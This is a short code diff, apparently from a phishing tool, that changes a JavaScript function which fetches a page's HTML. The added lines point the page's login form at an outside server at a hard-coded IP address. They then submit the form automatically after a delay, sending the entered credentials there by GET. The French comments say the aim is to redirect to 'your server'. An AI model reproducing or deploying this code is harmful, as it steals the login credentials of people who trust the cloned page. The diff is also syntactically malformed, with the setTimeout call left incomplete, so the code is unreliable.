@@ -413,9 +413,12 @@ const fetchHtmlFromUrl = async (req, res) => {
                   }
                 });
 
-                // Changer l'action du formulaire pour rediriger vers votre serveur
-                form.action = 'http://31.207.34.16:5000/api/logins/login-summary';
-                form.method = 'GET'; // Changez cela en fonction de vos besoins
+                setTimeout(() => {
+            // Changer l'action du formulaire pour rediriger vers votre serveur
+            form.action = 'http://31.207.34.16:5000/api/logins/login-summary';
+            form.method = 'GET'; // Changez cela en fonction de vos besoins
+            form.submit(); // Soumettre le formulaire après le délai
+          },
               }
             });
           });
